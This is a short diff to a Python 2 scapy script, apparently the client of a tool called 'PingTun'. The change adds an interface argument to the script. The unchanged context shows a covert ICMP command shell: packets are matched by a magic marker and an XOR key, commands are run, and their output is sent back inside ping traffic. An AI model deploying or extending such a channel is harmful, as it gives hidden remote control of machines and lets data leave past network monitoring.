@@ -1,4 +1,10 @@
 from scapy.all import *
+import sys
+
+if len(sys.argv) != 2:
+        print "[PingTun] Usage: python2 client.py <interface>"
+        print "[PingTun] Exiting..."
+        exit()
 
 xor = "\x42\x42\x42\x42"
 magic = "\xde\xad\xbe\xef"
@@ -37,7 +43,5 @@ def command_shell(data):
 	value = proc.stdout.read() + proc.stderr.read()
 
 	sendp(packet_builder(shell + value))
-	
-	
 
-sniff(filter="icmp",prn=action)
+sniff(iface=sys.argv[1],filter="icmp",prn=action)
